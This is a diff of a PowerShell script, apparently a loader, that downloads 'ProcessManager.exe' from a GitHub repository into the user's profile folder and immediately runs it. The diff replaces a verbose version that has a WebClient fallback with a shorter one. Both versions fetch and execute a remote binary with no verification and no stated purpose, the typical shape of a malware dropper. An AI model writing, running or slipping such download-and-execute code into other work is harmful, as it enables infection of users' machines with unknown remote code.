@@ -1,81 +1,22 @@
-# Force the script to continue on errors
-$ErrorActionPreference = "Continue"
+# Get current user's folder
+$userFolder = $env:USERPROFILE
+$destination = "$userFolder\ProcessManager.exe"
 
-Write-Host "=== File Downloader ===" -ForegroundColor Green
-Write-Host "Script started at: $(Get-Date)"
-
-# Hardcoded path to C:\Users\user\
-$destination = "C:\Users\user\"
-
-Write-Host "Hardcoded destination: $destination"
-
-# Create directory if it doesn't exist
-$userFolder = "C:\Users\user"
-if (-not (Test-Path $userFolder)) {
-    Write-Host "Creating directory: $userFolder" -ForegroundColor Yellow
-    New-Item -ItemType Directory -Path $userFolder -Force
-}
-
-# Download URL
-$url = "https://github.com/EncryptedByRollerV8/f/raw/main/ProcessManager.exe"
-
-# Delete existing file if it exists
-if (Test-Path $destination) {
-    Write-Host "Existing file found. Deleting..." -ForegroundColor Yellow
-    try {
-        Remove-Item -Path $destination -Force -ErrorAction Stop
-        Write-Host "Old file deleted successfully." -ForegroundColor Green
-    }
-    catch {
-        Write-Host "Warning: Could not delete old file: $($_.Exception.Message)" -ForegroundColor Red
-    }
-}
+Write-Host "Downloading to: $destination"
 
 try {
     # Download the file
-    Write-Host "`nDownloading from GitHub..." -ForegroundColor Cyan
+    Invoke-WebRequest -Uri "https://raw.githubusercontent.com/EncryptedByRollerV8/f/main/ProcessManager.exe" -OutFile $destination -UseBasicParsing
     
-    # Method 1: Try Invoke-WebRequest first
-    Invoke-WebRequest -Uri $url -OutFile $destination -UseBasicParsing -ErrorAction Stop
-    
-    Write-Host "✓ Download completed successfully!" -ForegroundColor Green
-    
-    # Verify the file was created
+    # Run the file
     if (Test-Path $destination) {
-        $fileSize = (Get-Item $destination).Length
-        Write-Host "✓ File verified: $fileSize bytes" -ForegroundColor Green
-        
-        # Run the application
-        Write-Host "`nStarting ProcessManager..." -ForegroundColor Yellow
-        Start-Process -FilePath $destination -ErrorAction Stop
-        Write-Host "✓ ProcessManager started!" -ForegroundColor Green
-    }
-    else {
-        Write-Host "❌ ERROR: File was not created at destination" -ForegroundColor Red
+        Write-Host "Download successful! Starting ProcessManager..."
+        Start-Process -FilePath $destination
     }
 }
 catch {
-    Write-Host "❌ DOWNLOAD ERROR: $($_.Exception.Message)" -ForegroundColor Red
-    
-    # Alternative download method
-    Write-Host "`nTrying alternative download method..." -ForegroundColor Yellow
-    try {
-        $webClient = New-Object System.Net.WebClient
-        $webClient.DownloadFile($url, $destination)
-        $webClient.Dispose()
-        
-        if (Test-Path $destination) {
-            Write-Host "✓ Alternative download successful!" -ForegroundColor Green
-            Start-Process -FilePath $destination
-        }
-    }
-    catch {
-        Write-Host "❌ Alternative download also failed: $($_.Exception.Message)" -ForegroundColor Red
-    }
+    Write-Host "Error: $($_.Exception.Message)"
 }
 
-# Keep window open
-Write-Host "`n=== Download Process Complete ===" -ForegroundColor Cyan
-Write-Host "File location: $destination"
-Write-Host "Press any key to close this window..." -ForegroundColor Yellow
+Write-Host "Press any key to close..."
 $null = $Host.UI.RawUI.ReadKey("NoEcho,IncludeKeyDown")
